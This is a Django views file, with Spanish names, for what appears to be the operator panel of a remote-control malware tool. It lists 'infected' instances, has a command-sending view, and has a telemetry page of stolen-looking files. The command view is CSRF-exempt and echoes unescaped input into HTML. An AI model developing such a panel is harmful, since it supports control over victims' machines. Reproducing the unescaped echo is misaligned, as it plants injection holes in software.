from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from django.http import HttpRequest, HttpResponse

# Create your views here.
from api.models import Instancia

def dashboard(request: HttpRequest):
    infectados = Instancia.objects.count()
    return render(request, "web/dashboard.html", {"infectados": infectados})

def user_list(request: HttpRequest):
    infectados = Instancia.objects.all()
    return render(request, "web/user_list.html", {"infectados": infectados})

def user_report(request: HttpRequest, infectado):
    infectado = Instancia.objects.get(pk=infectado)
    return render(request, "web/user_report.html", {"infectado": infectado})

def user_control(request: HttpRequest):
    infectados = Instancia.objects.all()
    return render(request, "web/user_control.html", {"infectados": infectados})

@csrf_exempt
def user_control_instance(request: HttpRequest, infectado):
    infectado = Instancia.objects.get(pk=infectado)
    if request.method == "POST":
        return HttpResponse(f'<p style="margin-bottom: -6px;">[{request.user.username}] {request.POST.get("command", "NADA")}</p>')
    return render(request, "web/user_control_instance.html", {"infectado": infectado})

def telemetry(request: HttpRequest):
    return render(request, "web/telemetry.html", {"archivos": [
        ["asd1.log", "27KB", ".LOG", "user1", "now"],
        ["asd2.txt", "8KB", ".TXT", "user3", " 3 hours ago"],
        ["asd3.zip", "2GB", ".ZIP", "user2", " 1 day ago"],
        ["asd4.jpeg", "1MB", ".JPEG", "user4", " 3 days ago"],
    ]})
